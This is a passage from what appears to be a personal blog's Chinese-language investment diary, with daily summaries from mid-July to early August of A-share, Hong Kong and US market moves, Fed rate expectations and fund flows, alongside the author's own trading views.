title="总结"></a>总结</h4><p>见证历史！今日日经指数触发熔断机制，世界主要资本市场全部崩盘，日经指数收跌超12%，纳斯达克100指数期货亚洲盘跌幅超5%，日元兑美元快速下探140关口，危机四伏。今日A股早盘表现良好，3000多支股票飘红，下午收到恐慌情绪进一步蔓延，A股同样加速跳水，但尾盘港股有所回升。自上周周三立起一根中阳线后能够有一段反弹行情的判断错误，但其他高位资本市场的崩盘有利于走出“东升西降”的格局，继续观察美联储表态和贵重金属等避险资产走势，保持A股仍有一段加速下跌杀恐慌盘的观点不变。</p><p><img src="https://m0dzer0.github.io/post/%E6%8A%95%E8%B5%84%E7%AC%94%E8%AE%B0/0805.png" srcset="/img/loading.gif" lazyload></p><h3 id="8月2日-周五"><a href="#8月2日-周五" class="headerlink" title="8月2日 周五"></a>8月2日 周五</h3><h4 id="总结-18"><a href="#总结-18" class="headerlink" title="总结"></a>总结</h4><p>昨日纳斯达克继续暴跌，今日亚洲股市全线崩盘，全球市场正在交易衰退预期，今日上证指数回踩五均，继续保持还有一段上行走势的观点，港股性价比逐渐显现，可以持续向恒生科技ETF优化持仓。</p><p><img src="https://m0dzer0.github.io/post/%E6%8A%95%E8%B5%84%E7%AC%94%E8%AE%B0/0802.png" srcset="/img/loading.gif" lazyload></p><h3 id="8月1日-周四"><a href="#8月1日-周四" class="headerlink" title="8月1日 周四"></a>8月1日 周四</h3><h4 id="总结-19"><a href="#总结-19" class="headerlink" title="总结"></a>总结</h4><p>今日美联储降息预期落地，预计9月份会第一次降息。今日A股行情分化，前期坚挺的半导体依然没有见顶现象，而大跌的新能源和白酒等昨日反弹后今日又出现阴包阳，可见趋势未见反转。短期继续看A股震荡修复，主要以科技线和证券行情为主。</p><p><img src="https://m0dzer0.github.io/post/%E6%8A%95%E8%B5%84%E7%AC%94%E8%AE%B0/0801.png" srcset="/img/loading.gif" lazyload></p><h3 id="7月31日-周三"><a href="#7月31日-周三" class="headerlink" title="7月31日 周三"></a>7月31日 周三</h3><h4 id="总结-20"><a href="#总结-20" class="headerlink" title="总结"></a>总结</h4><p>A股很久没有出现这样的强力中阳线了。今日由券商带队，科技股全面爆发，成交量超9000亿，可见情绪回暖和博弈利好的活跃。今日资金行为主要解读为昨日重要会议提出的新论调，和资金提前交易明日美联储鸽派信息的放出。但目前汇率端和国债端并没有形成跷跷板效应，主要为短期炒作资金做的超跌反弹行为，近日逢高可以逐渐优化仓位。</p><p><img src="https://m0dzer0.github.io/post/%E6%8A%95%E8%B5%84%E7%AC%94%E8%AE%B0/0731.png" srcset="/img/loading.gif" lazyload></p><h3 id="7月30日-周二"><a href="#7月30日-周二" class="headerlink" title="7月30日 周二"></a>7月30日 周二</h3><h4 id="总结-21"><a href="#总结-21" class="headerlink" title="总结"></a>总结</h4><p>公募基金重仓股打开下跌空间，尤其白酒板块深不见底。国家队继续抱团金融，游资抱团炒作连板股票。不放量，不加速，继续洗洗睡的行情。但目前的时间周期需要谨慎，目前传统的多头时间，A股没有主线，港股又将确立破位，如果再无修复行情则市场岌岌可危。</p><p><img src="https://m0dzer0.github.io/post/%E6%8A%95%E8%B5%84%E7%AC%94%E8%AE%B0/0730.png" srcset="/img/loading.gif" lazyload></p><h3 id="7月29日-周一"><a href="#7月29日-周一" class="headerlink" title="7月29日 周一"></a>7月29日 周一</h3><h4 id="总结-22"><a href="#总结-22" class="headerlink" title="总结"></a>总结</h4><p>很喜欢螺旋老师的一句话：这盘子又是洗洗睡的行情。横久必跌，指数一直挂在2900点附近，既没有买盘放量，也没有恐慌盘的涌出，等待本周重要会议是否会释放一些资本市场的信号，短期继续持币观望。8月过后南向资金也不披露实时数据了，分析资金已经没什么意义了。但港股尤其是互联网龙头的估值已经很低了，等待美联储进入降息周期应当会有一波50%以上的大反弹，最近可以逐步布局。</p><p><img src="https://m0dzer0.github.io/post/%E6%8A%95%E8%B5%84%E7%AC%94%E8%AE%B0/0729.png" srcset="/img/loading.gif" lazyload></p><h3 id="7月26日-周五"><a href="#7月26日-周五" class="headerlink" title="7月26日 周五"></a>7月26日 周五</h3><h4 id="总结-23"><a href="#总结-23" class="headerlink" title="总结"></a>总结</h4><p>纳斯达克指数继续下跌，但A股今日反弹，呈现小普涨的格局，但赚钱效应一般，成交量也没有进一步放大，看短暂的弱势修复，继续持筹场外观望。港股性价比逐渐凸显，如果A股联动加速下跌可以进行布局，如果A股延续弱势，510300仍然放量，则看港股下探前低附近。</p><p><img src="https://m0dzer0.github.io/post/%E6%8A%95%E8%B5%84%E7%AC%94%E8%AE%B0/0726.png" srcset="/img/loading.gif" lazyload></p><h3 id="7月25日-周四"><a href="#7月25日-周四" class="headerlink" title="7月25日 周四"></a>7月25日 周四</h3><h4 id="总结-24"><a href="#总结-24" class="headerlink" title="总结"></a>总结</h4><p>最近全球资本市场风声鹤唳，A股各大指数破位，成交量仍然没有放出，美股昨天崩盘之后今天也没有强势修复的征兆，全球正在交易大衰退的预期，继续持币观望。但值得注意的是，离岸人民币突然大幅升值，既有日元走强美元指数弱势的原因，也可能与设备更新的政策有关，但如果汇率没有走出持续性，那么A股资产目前依旧不会受到外资青睐。</p><p><img src="https://m0dzer0.github.io/post/%E6%8A%95%E8%B5%84%E7%AC%94%E8%AE%B0/0725.png" srcset="/img/loading.gif" lazyload></p><h3 id="7月24日-周三"><a href="#7月24日-周三" class="headerlink" title="7月24日 周三"></a>7月24日 周三</h3><h4 id="总结-25"><a href="#总结-25" class="headerlink" title="总结"></a>总结</h4><p>今天并未随着认沽期权的平仓而止跌企稳，上午走出的十字星也没有迎来下午的金针探底，那就是下跌中继无疑了。说了好几次的逢高减仓，终于在今天减掉了。继续场外观察是否出现指数突然加速，恐慌盘涌出。目前先看2860点附近的跳空缺口补了之后能否企稳。</p><p><img src="https://m0dzer0.github.io/post/%E6%8A%95%E8%B5%84%E7%AC%94%E8%AE%B0/0724.png" srcset="/img/loading.gif" lazyload></p><h3 id="7月23日-周二"><a href="#7月23日-周二" class="headerlink" title="7月23日 周二"></a>7月23日 周二</h3><h4 id="总结-26"><a href="#总结-26" class="headerlink" title="总结"></a>总结</h4><p>今日A股空头情绪宣泄，利空未知，料与明日ETF期权交割有关，但下午两点时分突然杀出恐慌盘，指数迅速跳水，尤其科创50跌4%，半导体大跌，抱团科特估的逻辑受到挑战。今日大跌，主要指数都下穿了所有日级别均线，护盘一周的努力有付之东流之势，看明日下午交割结束后是否有探底企稳之势，否则可能复刻今年一月末恐慌踩踏的走势。近日的明星沙特ETF溢价基本跌完，可以考虑博弈市场失望情绪导致的抱团行为。</p><p><img src="https://m0dzer0.github.io/post/%E6%8A%95%E8%B5%84%E7%AC%94%E8%AE%B0/0723.png" srcset="/img/loading.gif" lazyload></p><h4 id="资金"><a href="#资金" class="headerlink" title="资金"></a>资金</h4><p>今日南向资金小幅流入，受A股大跌影响港股也有所回落，继续以AH联动逻辑跟踪。</p><h3 id="7月22日-周一"><a href="#7月22日-周一" class="headerlink" title="7月22日 周一"></a>7月22日 周一</h3><h4 id="总结-27"><a href="#总结-27" class="headerlink" title="总结"></a>总结</h4><p>今日A股涨多跌少，但指数并未翻红，主要受红利资产抱团逐渐瓦解影响，权重股均出现回调。但在H股中却呈现上涨，可见港股投资性价比逐渐显现。待经济指标企稳后，在美联储降息的驱动下，港股受基本面和流动性双重利好，一定会走出一波精彩的行情。但是目前，A股仍然由国家队资金托举，市场大资金做多意愿不强，近期持续关注代表科特股概念的半导体，如果有效突破可能会催生出中特股转科特估的行情。近期美股财报季叠加交易降息预期即将结束，随时都可能大幅回调，继续保持谨慎。</p><p><img src="https://m0dzer0.github.io/post/%E6%8A%95%E8%B5%84%E7%AC%94%E8%AE%B0/0722.png" srcset="/img/loading.gif" lazyload></p><h4 id="A股"><a href="#A股" class="headerlink" title="A股"></a>A股</h4><p>今天的股市不可谓不精彩，中信证券九连阳之后，舆论在自媒体发酵，周末横空出世一位上海爷叔的惊人论断，散户齐聚，成交金额超70亿，在国家队和外资的推动下，中信证券最终收跳空阳线，但所谓中信证券三连板纯属无稽之谈。周末在互联网上发酵的多头情绪叠加今日央行双降利好，中小盘科技股上午表现良好，双创板块大面积飘红。但由于银行、石油等红利资产的下跌和大资金的恐高情绪，下午双创指数大幅回落至海平面以下。但在两点半时，国家队多处发力，拉升权重股和沪深300ETF稳住了盘面，其中510300半小时流入超50亿，可见继续护盘之决心。但目前市场情绪并没有逆转，复苏逻辑也没有坚实的证据，考虑近期减仓消费板块。</p><h4 id="资金-1"><a href="#资金-1" class="headerlink" title="资金"></a>资金</h4><p>今日南向资金流入20亿，港股涨超1%，看修复性行情，考虑博弈中概互联网中报预期。</p><h3 id="7月19日-周五"><a href="#7月19日-周五" class="headerlink" title="7月19日 周五"></a>7月19日 周五</h3><h4 id="总结-28"><a href="#总结-28" class="headerlink" title="总结"></a>总结</h4><p>全球主要股市继续维持弱势，🇺🇸科技股有一段回调的预期。恒生指数今日大跌破位，若下周前两个交易日不能拉回，则可能试探4月份前低（16000点），继续维持谨慎。今日重要会议结束，科创50继续走强，半导体放量上涨，抱团情绪明显。代表消费复苏的医药、白酒连涨一周，看修复行情，但基本面不支撑反转。今日3000余只个股上涨，在科技方向，主要以龙头和国企央企领涨，科特股行情仍有持续性，但整体交易仍不活跃，债市避险情绪依然浓厚，看A股继续震荡反弹，继续观察情绪指标。</p><p><img src="https://m0dzer0.github.io/post/%E6%8A%95%E8%B5%84%E7%AC%94%E8%AE%B0/0719.png" srcset="/img/loading.gif" lazyload></p><h4 id="资金-2"><a href="#资金-2" class="headerlink" title="资金"></a>资金</h4><p>今日港股毫无抵抗式下跌，南向资金大幅买入60多亿，国家队护盘方向的沪深300ETF（510300）放出巨量113.7亿，从量上来看猛拉六波，短期内大盘风险不大，继续观察资金轮动。</p><h3 id="7月18日-周四"><a href="#7月18日-周四" class="headerlink" title="7月18日 周四"></a>7月18日 周四</h3><h4 id="总结-29"><a href="#总结-29" class="headerlink" title="总结"></a>总结</h4><p>今天没什么看头，纳斯达克昨晚崩盘式下跌近3%，半导体暴跌，但今日仍在重大会议期间，国家队尽力维稳，指数为非市场化走势。未来趋势还得看明日利好和下半年经济政策预期。近日半导体抱团现象明显，注意观察是否出现放量回落。</p><p><img src="https://m0dzer0.github.io/post/%E6%8A%95%E8%B5%84%E7%AC%94%E8%AE%B0/0718.png" srcset="/img/loading.gif" lazyload></p><h3 id="7月17日-周三"><a href="#7月17日-周三" class="headerlink" title="7月17日 周三"></a>7月17日 周三</h3><h4 id="总结-30"><a href="#总结-30" class="headerlink" title="总结"></a>总结</h4><p>黄金如期突破历史性高点，创下2482美元&#x2F;盎司的新高，中午时分，纳斯达克100指数期货突然下跌1%，原因不明。今日A股涨少跌多，科技线没有表现，市场炒作以白酒、医药为代表的消费复苏预期，可能与明日重大会议的利好和路透社传周六降息有关。今日多头力量薄弱，港股弱势修复，A股小放量下跌，代表神秘资金护盘的沪深300ETF（510300）显著放量，但没有恐慌性抛盘涌出。考虑到近日美联储议息会议和两会的重要经济决策等信息即将放出，近几日的A股市场反应将决定下半年的整体趋势。</p><p><img src="https://m0dzer0.github.io/post/%E6%8A%95%E8%B5%84%E7%AC%94%E8%AE%B0/0717.png" srcset="/img/loading.gif" lazyload></p><h4 id="资金-3"><a href="#资金-3" class="headerlink" title="资金"></a>资金</h4><p>今日港股弱势修复，南向资金小幅流出，可能与资金离开港股护盘A股的行为有关。主力资金流出超300亿，两市成交量约6750亿。</p><h3 id="7月16日-周二"><a href="#7月16日-周二" class="headerlink" title="7月16日 周二"></a>7月16日 周二</h3><h4 id="总结-31"><a href="#总结-31" class="headerlink" title="总结"></a>总结</h4><p>国际市场上，近日美联储鸽派声音不断，降息临近，作为具有货币属性的贵金属正在进攻历史性高点，截至晚上八点，伦敦金已经突破了2440美元&#x2F;盎司，看继续走多头趋势。近日不断创下历史新高的各国股市的降息预期交易已经呈现出结束样态。港股市场在周五因美国CPI数据利好上涨后，连续两日下跌回补跳空缺口，跌至各日线均线以下，短期无法判断是技术性破位还是毛刺行情。今日中债长债早盘大幅跳水，A股应声上涨，但没有放量，午后国债价格又有所回升，股市诚意不足，短期趋势未见反转。</p><p><img src="https://m0dzer0.github.io/post/%E6%8A%95%E8%B5%84%E7%AC%94%E8%AE%B0/0716.png" srcset="/img/loading.gif" lazyload></p><h4 id="A股-1"><a href="#A股-1" class="headerlink" title="A股"></a>A股</h4><p>今日A股低开高走，主要风格为不涨大票涨小票，尤其以半导体、人工智能产业链涨势最佳。股指期货方向，上证50空升多降，而代表小票的中证1000却空降多升，小票行情可能与上周的停止转融券有关。今日最靓的仔当属寒武纪-U和紫光股份的涨停，但只有紫光股份有主力大量抢筹的现象，推测人工智能方向的行情持续性要更强。持有的浪潮信息、中科曙光两只股票已经突破所有均线，预计还有上升趋势，但受经济基本面影响，中期趋势并没有好转，近日逢高做减仓动作。</p><h4 id="资金-4"><a href="#资金-4" class="headerlink" title="资金"></a>资金</h4><p>今日港股下跌，但南向资金流入超60亿，看短期继续震荡。紫光股份主力流入超8亿，浪潮信息超5亿。两市成交量约6500亿。</p>]]></content>
    
    
    <categories>
      
      <category>金融</category>
      
    </categories>
    
    
    <tags>
      
      <tag>投资</tag>
      
      <tag>权益资产</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
